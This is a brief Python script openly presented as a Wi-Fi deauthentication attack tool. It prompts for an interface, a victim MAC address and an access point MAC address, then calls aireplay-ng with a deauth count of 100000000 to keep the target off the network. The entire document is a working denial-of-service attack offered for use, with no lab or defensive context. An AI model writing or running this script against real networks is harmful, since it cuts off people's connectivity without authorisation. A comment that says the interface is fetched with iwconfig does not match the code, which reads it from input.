# Deauthentication Attack Script
# This script performs a deauthentication attack on a specified Wi-Fi network.

import os
import subprocess
def deauth_attack(interface, target_mac, gateway_mac):
    print(f"[+] Starting deauthentication attack on {target_mac} via {gateway_mac} using {interface}")
    
    # Construct the command for the deauthentication attack
    command = [
        "sudo", "aireplay-ng", "--deauth", "100000000", "-a", gateway_mac, "-c", target_mac, interface
    ]
    
    # Execute the command
    subprocess.call(command)
    
    
# Example usage
if __name__ == "__main__":
    # Fetch the interface name using iwconfig command
    interface = input("Enter the interface name (e.g., wlan0): ")
    target_mac = input("Enter the target MAC address (victim): ")
    gateway_mac = input("Enter the gateway (AP) MAC address: ")
    print(f"[+] Initiating Deauthentication attack on {target_mac} via {gateway_mac} using {interface}")
    deauth_attack(interface, target_mac, gateway_mac)
    print("[+] Deauthentication attack completed")
    